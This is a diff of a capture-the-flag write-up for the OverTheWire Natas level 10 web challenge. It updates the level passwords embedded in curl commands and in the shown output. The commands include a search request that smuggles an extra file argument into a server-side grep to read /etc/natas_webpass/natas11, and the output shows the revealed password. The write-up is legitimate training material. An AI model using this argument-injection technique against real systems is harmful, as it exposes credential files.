@@ -1,7 +1,7 @@
-### natas10 pswd: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+### natas10 pswd: EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
 
 ```bash
-curl -v -s -c cookie.txt -X POST http://natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu@natas10.natas.labs.overthewire.org
+curl -v -s -c cookie.txt -X POST http://natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv@natas10.natas.labs.overthewire.org
 
 # * Host natas10.natas.labs.overthewire.org:80 was resolved.
 # * IPv6: (none)
@@ -51,7 +51,7 @@ curl -v -s -c cookie.txt -X POST http://natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
 Let's have a look on the source code, to be sure what is filtered out
 
 ```bash
-curl -s  http://natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu@natas10.natas.labs.overthewire.org/index-source.html | w3m -dump -T text/html
+curl -s  http://natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv@natas10.natas.labs.overthewire.org/index-source.html | w3m -dump -T text/html
 # <html>
 # <head>
 # <body>
@@ -128,7 +128,7 @@ grep -i . /etc/natas_webpass/natas11 dictionary.txt
 - `dictionary.txt` this is the *second* file to search
 
 ```bash
-curl -s 'http://natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu@natas10.natas.labs.overthewire.org/?needle=.+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search' | head -26
+curl -s 'http://natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv@natas10.natas.labs.overthewire.org/?needle=.+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search' | head -28
 # <html>
 # <head>
 # <body>
@@ -143,7 +143,7 @@ curl -s 'http://natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu@natas10.natas.labs.over
 # 
 # Output:
 # <pre>
-  /etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+/etc/natas_webpass/natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
 # dictionary.txt:African
 # dictionary.txt:Africans
 # dictionary.txt:Allah
